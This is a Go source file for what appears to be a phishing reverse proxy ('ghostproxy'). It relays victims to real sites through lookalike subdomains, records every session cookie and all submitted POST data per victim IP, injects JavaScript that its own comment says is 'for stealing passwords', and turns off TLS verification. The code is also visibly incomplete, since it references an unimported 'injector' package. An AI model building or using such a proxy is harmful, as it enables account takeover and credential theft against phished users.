package proxy

import (
	"crypto/tls"
	"net/http"
	"net/http/httputil"
	"strings"
	"ghostproxy/storage"
)

func ProxyHandler(w http.ResponseWriter, r *http.Request) {
	host := strings.ToLower(r.Host)
	target := extractTargetFromHost(host)
	if target == "" {
		http.Error(w, "Invalid target", http.StatusBadRequest)
		return
	}

	reverse := &httputil.ReverseProxy{
		Director: func(req *http.Request) {
			req.URL.Scheme = "https"
			req.URL.Host = target
			req.Host = target
			req.Header.Set("X-Forwarded-Host", r.Host)
		},
		ModifyResponse: func(resp *http.Response) error {
			// Log cookies
			for _, c := range resp.Cookies() {
				storage.SaveCookie(r.RemoteAddr, target, c)
			}
			// JS injection for stealing passwords
			injector.InjectJS(resp)
			return nil
		},
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}

	if r.Method == http.MethodPost {
		storage.SavePostData(r)
	}
	reverse.ServeHTTP(w, r)
}

func extractTargetFromHost(host string) string {
	// Example: login.google.proxy.domain.com
	parts := strings.Split(host, ".")
	if len(parts) < 4 {
		return ""
	}
	return parts[0] + "." + parts[1] + ".com"
}
